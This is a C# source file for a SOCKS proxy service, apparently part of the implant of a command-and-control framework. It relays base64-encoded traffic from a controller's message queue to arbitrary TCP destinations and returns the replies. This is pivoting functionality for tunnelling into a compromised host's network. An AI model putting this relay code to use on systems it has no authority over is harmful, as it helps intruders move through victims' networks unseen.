using Agent.Models;
using Agent.Service;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using Agent.Helpers;

namespace Agent.Service
{
    public class ProxyService : RunningService, IProxyService
    {
        protected ConcurrentQueue<SocksMessage> _InboudMessages = new ConcurrentQueue<SocksMessage>();
        protected ConcurrentQueue<SocksMessage> _OutboundMessages = new ConcurrentQueue<SocksMessage>();

        Dictionary<string, TcpClient> Clients = new Dictionary<string, TcpClient>();

        public override string ServiceName => "Socks Proxy";

        public ProxyService()
        {
        }

        public override async Task Process()
        {
            List<string> toRemove = new List<string>();

            //Process received Messages
            var msgReceived = this.DequeueAllRequest();
            foreach (var id in msgReceived.Keys)
            {
                try
                {
                    var messages = msgReceived[id];

                    if (messages.Any(m => !m.ConnexionState))
                        toRemove.Add(id);
                    bool newConnection = messages.Any(m => m.ConnexionState && m.Data == null);

                    while (messages.Any())
                    {
                        var received = messages.Dequeue();

                        //connection
                        if (received.Data == null && received.ConnexionState)
                        {
                            Debug.WriteLine($"New connection : {id}");
                            var destination = new TcpClient();
                            var destAddres = id.Split('|')[1];

                            if (!destination.ConnectAsync(destAddres.Split(':')[0], int.Parse(destAddres.Split(':')[1])).Wait(500))
                            {
                                this.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = false,
                                });
                                Debug.WriteLine($"Connexion refused {id}");
                            }
                            else
                            {
                                if (!Clients.ContainsKey(id))
                                    Clients.Add(id, destination);
                                else
                                    Clients[id] = destination;

                                this.EnqueueResponse(new SocksMessage()
                                {
                                    Source = id,
                                    ConnexionState = true,
                                });

                                Debug.WriteLine($"Connexion accepted {id}");
                            }
                        }
                        if (received.Data == null && !received.ConnexionState)
                        {
                            //disconnection
                            Debug.WriteLine($"Connexion closed {id} (from source)");
                            if (Clients.ContainsKey(id))
                            {
                                var dest = Clients[id];
                                toRemove.Add(id);
                                dest.Close();
                            }

                        }

                        //data to send
                        if (!string.IsNullOrEmpty(received.Data))
                        {
                            if (!Clients.ContainsKey(id))
                            {
                                Debug.WriteLine($"Data received but no client with id {id}");
                                break;
                            }

                            var dest = Clients[id];
                            var data = Convert.FromBase64String(received.Data);
                            dest.SendMessage(data);
                            Debug.WriteLine($"Data sent to {id} ({data.Length})");
                        }
                    }
                }
                catch (Exception ex)
                {
                    toRemove.Add(id);
                }
            }

            //Get clients responses and send them
            foreach (var id in Clients.Keys)
            {
                try
                {
                    var dest = Clients[id];
                    if (dest.DataAvailable())
                    {
                        var data = dest.ReceivedData();
                        this.EnqueueResponse(new SocksMessage()
                        {
                            Source = id,
                            Data = Convert.ToBase64String(data),
                            ConnexionState = true,
                        });
                        Debug.WriteLine($"Data received from {id} ({data.Length})");
                    }
                }
                catch (Exception ex)
                {
                    toRemove.Add(id);
                    this.EnqueueResponse(new SocksMessage()
                    {
                        Source = id,
                        ConnexionState = false,
                    });
                    Debug.WriteLine($"Connexion closed {id} (from dest - exception)");
                }
            }

            //Cleanup closed clients
            foreach (var id in toRemove.ToList())
                Clients.Remove(id);
        }

        public void EnqueueResponse(SocksMessage mess)
        {
            this._OutboundMessages.Enqueue(mess);
        }

        public List<SocksMessage> GetResponses()
        {
            var list = new List<SocksMessage>();
            while (this._OutboundMessages.Any())
            {
                this._OutboundMessages.TryDequeue(out var mes);
                list.Add(mes);
            }

            return list;
        }

        public void AddRequests(IEnumerable<SocksMessage> messages)
        {
            foreach (var item in messages)
            {
                _InboudMessages.Enqueue(item);
            }
        }

        public SocksMessage DequeueRequest()
        {
            var q = _InboudMessages;
            if (!q.Any())
                return null;
            q.TryDequeue(out var mess);
            return mess;
        }

        public Dictionary<string, Queue<SocksMessage>> DequeueAllRequest()
        {
            var dico = new Dictionary<string, Queue<SocksMessage>>();

            var q = _InboudMessages;
            if (!q.Any())
                return dico;
            q.TryDequeue(out var mess);
            if (dico.ContainsKey(mess.Source))
                dico[mess.Source].Enqueue(mess);
            else
            {
                var newQueue = new Queue<SocksMessage>();
                newQueue.Enqueue(mess);
                dico.Add(mess.Source, newQueue);
            }
            return dico;
        }

    }
}
